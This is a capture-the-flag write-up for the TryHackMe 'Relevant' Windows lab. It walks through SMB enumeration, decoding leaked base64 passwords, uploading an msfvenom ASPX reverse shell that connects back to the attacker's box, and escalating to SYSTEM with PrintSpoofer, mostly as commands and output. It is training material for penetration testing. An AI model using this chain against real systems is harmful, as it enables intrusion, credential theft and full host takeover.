---

Name: Relevant
Difficulty: Medium
URL: https://tryhackme.com/room/relevant

---

<!--TODO
Write an actual report

Note from creator:
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
-->

# Solution
First we start by scanning the target for open ports
```bash
rustscan -a relevant.thm --ulimit 5000 -- -sC -sV
```

```bash
ORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2026-07-15T09:37:57+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-14T09:27:39
| Not valid after:  2027-01-13T09:27:39
| MD5:   c53f 57cb adee 1ea6 94d1 ea57 4edf b90b
| SHA-1: 46a5 7d0d 6223 3bab d23d 1edf f4e0 6d1f fb42 3020
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQGzvBK+XV9YlIm9sv44FcvjANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yNjA3MTQwOTI3MzlaFw0yNzAxMTMwOTI3
| MzlaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAtE/kHNQOyoutuT8+B227H1BD6mm47m5KxSWhoeNN6Ocm1Wy8Wq0R
| HLH0kV0uXQ8NixvVsmHTAmP6/dTfrEV8R23FzX2cfRjSWdFPq4xyftP+nwI8RzgE
| bQUNFPmDivdhsbeg8zGOWrXa40jM4HpYYcq/SL6pKAZ/G9Nxoc+0s+mAcZRSEGX2
| E/XXXFsyGUwH0BvVJ5L4zF2pXduwLmHkNftLHSKX3C+SHf1DKTCZZ6YxQ8kZg2GB
| KAeTVB/u7Bg9EjbE4RvPMnkyY/XafNUBt5d4IrZZ4nknk97FmpkGFlws5W8C6qud
| pDY8myE9bEpS7hV7pMh2n10fHvbZd+r+twIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAK4rWl2fTOOP
| KUDPmC/kA/PISYsf1UiUuJQoJwW7uuVGTbtpY4uw3sAu2X/EmU/0BjVV/Pef/G/2
| zrUJ8rFHF1krqHKQvXm4dJMFvJpRX5HTjZ14CaVxyQwuu+LugnYqCTaPlslJe4UY
| 9OecFp3/4AtvvPdfjFN52LhrQYkciMBAY3PPvY51vVFRHjGAT7iI+M4BQezR3F53
| 1T6l0cFSvaEsdnBC2YC1qFt3l/27b38IJk0OTPF/vDoZIF7k3sNG8+iEN7zq75ur
| cs5yDrBLSNUsAQfAo+BIiBdcWtNeowuKCzdy3W6+x1Hab2W0gGOKNgAyfs1uW4dD
| T4gXtr5cDUo=
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-07-15T09:37:17+00:00
49663/tcp open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC

```

Gobuster didn't find anything useful
```bash
gobuster dir -u http://relevant.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 -x txt,php,html,bak,zip,log -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://relevant.thm/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html,bak,zip,log
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
*checkout*           (Status: 400) [Size: 3420]
*docroot*            (Status: 400) [Size: 3420]
*                    (Status: 400) [Size: 3420]
devinmoore*          (Status: 400) [Size: 3420]
200109*              (Status: 400) [Size: 3420]
*dc_                 (Status: 400) [Size: 3420]
*sa_                 (Status: 400) [Size: 3420]
Progress: 1543899 / 1543899 (100.00%)
===============================================================
Finished
===============================================================
```

And started looking with iismap
```bash
./iismap --target http://relevant.thm/

▀█▀ ▀█▀ █▀▀ █▄█▄█ █▀▀█ █▀▀█
 ▀█▀  ▀█▀ ▀▀█ █ █ █ █▄▄█ █▄▄█
 ▀▀▀  ▀▀▀ ▀▀▀ ▀ ▀ ▀ ▀  ▀ ▀
IIS Security Scanner Framework v1.0.0
Comprehensive IIS Vulnerability Assessment Tool
Use responsibly and only on authorized targets

[+] Target: http://relevant.thm/
[+] Starting scan...
[12:38:05] [VULN] [HIGH] Unencrypted HTTP Connection
[12:38:07] [VULN] [MEDIUM] Event Validation Disabled
[12:38:07] [VULN] [MEDIUM] ASP.NET Detailed Error Information Disclosure
[12:38:07] [VULN] [LOW] X-Powered-By Header Information Disclosure
[12:38:09] [VULN] [HIGH] Dangerous HTTP Method Enabled: TRACE

[+] Scan completed!
[+] Duration: 7.03 seconds
[+] Report: iis_scan_report_1784108285.json
[!] 6 vulnerabilities detected!


```

Lets take a loot at the smb shares
```bash
smbclient -L //relevant.thm/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
SMB1 disabled -- no workgroup available

```

Found password.txt in the nt4wrksv share
```bash
smbclient //relevant.thm/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 00:46:04 2020
  ..                                  D        0  Sun Jul 26 00:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 18:15:33 2020

                7735807 blocks of size 4096. 5088368 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \> exit
```

```bash
cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk%
```

Now we can decode them
```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123%
```

We try to connect to his share, but we are not succesful
```bash
smbclient //relevant.thm/C$ -U Bob
Password for [SAMBA\Bob]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Looking at the other one we see that it is not valid
```bash
echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk%' | base64 -d
Bill - Juw4nnaM4n420696969!$$$base64: invalid input
```
```bash
Juw4nnaM4n420696969!$$$
```

When on the attack box and tried everything
```bash
root@ip-10-112-69-223:~# smbclient //relevant.thm/C$ -U Bob
Password for [WORKGROUP\Bob]:
session setup failed: NT_STATUS_LOGON_FAILURE
root@ip-10-112-69-223:~# smbclient //relevant.thm/ADMIN$ -U Bob
Password for [WORKGROUP\Bob]:
tree connect failed: NT_STATUS_ACCESS_DENIED
root@ip-10-112-69-223:~# smbclient //relevant.thm/IPC$ -U Bob
Password for [WORKGROUP\Bob]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> exit
root@ip-10-112-69-223:~# smbclient //relevant.thm/IPC$ -U Bill
Password for [WORKGROUP\Bill]:
Try "help" to get a list of possible commands.
smb: \> exit
root@ip-10-112-69-223:~# smbclient //relevant.thm/C$ -U Bill
Password for [WORKGROUP\Bill]:
tree connect failed: NT_STATUS_ACCESS_DENIED
root@ip-10-112-69-223:~# smbclient //relevant.thm/ADMIN$ -U Bill
Password for [WORKGROUP\Bill]:
tree connect failed: NT_STATUS_ACCESS_DENIED
root@ip-10-112-69-223:~# 

```

We can upload files
```bash
root@ip-10-112-69-223:~# smbclient //relevant.thm/nt4wrksv -U Bob
Password for [WORKGROUP\Bob]: !P@$$W0rD!123
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 21:46:04 2020
  ..                                  D        0  Sat Jul 25 21:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020

		7735807 blocks of size 4096. 4924114 blocks available
smb: \> put test.txt
test.txt does not exist
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
```

We can view the file at http://relevant.thm:49663/nt4wrksv/test.txt

Generate a reverse shell payload with msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=10.112.69.223 \
LPORT=4444 \
-f aspx \
-o shell.aspx
```

Upload it 
```bash
smb: \> put shell.aspx
```

Start a listener
```bash
nc -lvnp 4444
```

Access the file at http://relevant.thm:49663/nt4wrksv/shell.aspx
```bash
Connection received on 10.112.181.147 49905
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

```

Now we have a shell and can read the user flag
```bash
c:\Users\Bob\Desktop>type user.txt
THM{REDACTED}
```

Lets find more information about the machine and our user
```powershell
c:\Users\Bob\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

```powershell
c:\Users\Bob\Desktop>systeminfo
systeminfo

Host Name:                 RELEVANT
OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00378-00000-00000-AA739
Original Install Date:     7/25/2020, 7:56:59 AM
System Boot Time:          7/15/2026, 2:55:05 AM
System Manufacturer:       Amazon EC2
System Model:              t3a.micro
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2200 Mhz
BIOS Version:              Amazon EC2 1.0, 10/16/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     1,000 MB
Available Physical Memory: 369 MB
Virtual Memory: Max Size:  2,024 MB
Virtual Memory: Available: 977 MB
Virtual Memory: In Use:    1,047 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3192137
                           [02]: KB3211320
                           [03]: KB3213986
Network Card(s):           1 NIC(s) Installed.
                           [01]: Amazon Elastic Network Adapter
                                 Connection Name: Ethernet 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.112.128.1
                                 IP address(es)
                                 [01]: 10.112.181.147
                                 [02]: fe80::942b:d074:21e3:de68
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We have
```bash
SeImpersonatePrivilege        Enabled
and
OS Version: 10.0.14393
```
SeImpersonatePrivilege allows a process to impersonate the security token of another authenticated user. Service accounts such as IIS application pools commonly have this privilege because they need to act on behalf of authenticated clients.

The PrintSpoofer tool abuses this privilege by creating a named pipe and coercing the Windows Print Spooler service, which runs as NT AUTHORITY\SYSTEM, to authenticate to it. Once the SYSTEM process connects, PrintSpoofer duplicates the SYSTEM access token and launches a new process using that token.

As a result, we obtain a SYSTEM shell without exploiting a memory corruption vulnerability or knowing an administrator password.

We download the exploit
```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

Execute it
```powershell
PrintSpoofer64.exe - i -c powershell.exe
```

And read the flag
```powershell
type root.txt
```

```txt
THM{REDACTED}
```
